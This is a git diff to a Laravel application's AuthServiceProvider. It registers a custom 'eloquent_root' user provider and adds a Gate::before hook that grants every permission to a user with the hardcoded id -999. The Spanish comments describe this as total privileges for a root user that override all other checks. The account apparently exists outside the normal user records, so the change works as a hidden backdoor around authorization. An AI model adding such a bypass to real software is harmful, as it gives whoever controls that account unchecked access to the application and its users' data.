@@ -2,10 +2,11 @@
 
 namespace App\Providers;
 
-use App\Analisis;
 use App\AnalisisSupervisor;
 use Illuminate\Foundation\Support\Providers\AuthServiceProvider as ServiceProvider;
 use Illuminate\Support\Facades\Gate;
+use Illuminate\Support\Facades\Auth;
+use App\Extensions\RootUserProvider;
 
 class AuthServiceProvider extends ServiceProvider
 {
@@ -26,6 +27,20 @@ class AuthServiceProvider extends ServiceProvider
     public function boot()
     {
         $this->registerPolicies();
+
+        // 1. Registrar el Driver personalizado "eloquent_root"
+        Auth::provider('eloquent_root', function ($app, array $config) {
+            return new RootUserProvider($app['hash'], $config['model']);
+        });
+
+        // 2. Dar PRIVILEGIOS TOTALES al usuario Root
+        // Este Gate se ejecuta antes que cualquier otra validación de permisos.
+        Gate::before(function ($user, $ability) {
+            // Si el ID del usuario es el del ROOT (-999), permitimos TODO.
+            if ($user->id === -999) {
+                return true;
+            }
+        });
 
         Gate::define('edit-users', function($user){
             return $user->hasRole('admin');
